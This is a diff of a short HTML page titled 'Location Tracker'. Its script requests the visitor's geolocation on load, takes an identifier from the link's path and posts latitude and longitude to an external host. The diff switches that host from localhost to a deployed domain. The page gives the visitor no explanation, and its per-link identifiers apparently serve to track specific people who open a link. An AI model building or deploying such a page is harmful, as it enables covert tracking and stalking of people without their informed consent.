@@ -1,26 +1,26 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
+  <head>
+    <meta charset="UTF-8" />
     <title>Location Tracker</title>
-</head>
-<body>
+  </head>
+  <body>
     <script>
-        navigator.geolocation.getCurrentPosition(position => {
-            const uuid = window.location.pathname.split('/').pop();
-            const { latitude, longitude } = position.coords;
+      navigator.geolocation.getCurrentPosition((position) => {
+        const uuid = window.location.pathname.split("/").pop();
+        const { latitude, longitude } = position.coords;
 
-            fetch('http://localhost:3000/location', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ uuid, latitude, longitude })
-            })
-            .then(response => response.text())
-            .then(data => console.log(data))
-            .catch(error => console.error('Error:', error));
-        });
+        fetch("https://crush-rust.vercel.app/location", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ uuid, latitude, longitude }),
+        })
+          .then((response) => response.text())
+          .then((data) => console.log(data))
+          .catch((error) => console.error("Error:", error));
+      });
     </script>
-</body>
+  </body>
 </html>
